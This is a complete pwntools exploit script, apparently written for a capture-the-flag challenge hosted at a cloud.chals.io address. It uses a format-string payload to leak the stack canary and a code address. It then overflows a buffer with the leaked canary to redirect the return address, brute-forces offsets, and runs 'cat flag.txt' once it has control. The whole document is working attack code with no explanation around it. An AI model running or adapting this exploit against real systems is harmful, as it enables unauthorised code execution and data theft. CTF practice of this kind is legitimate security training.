from pwn import *
import time

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *$rebase(0x12e6)
break *$rebase(0x1274)
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 12229)
    else:
        return process(e.path)

def ret_leaks(n):
  p.recvuntil(b'?')
  p.sendline(b'%10$p.%13$p')
  leaks=p.recv().split(b'.')
  main = int(leaks[0],16)
  canary=int(leaks[1],16)
  return main,canary

f = open('offsets.txt','w')

for x in range(1,120,1):
  p = start()
  main,canary = ret_leaks(x)
  ret = main+x
 
  log.info('Canary: %s' %hex(canary))
  log.info('Main: %s' %hex(main))
  log.info('Attempt %s' %hex(x))

  p.sendline(cyclic(24)+p64(canary)+cyclic(8)+p64(ret)+p64(main))
  time.sleep(0.1)
  p.sendline(b'cat flag.txt')
  time.sleep(0.1)
  try:
   data = p.recv()
   if len(data) > 0:
      print("******************************** %s ********" %data)
      print('> attempt: %i' %x)
      f.write('> attempt: %i' %x)
      p.close()
  except:
   pass
f.close()
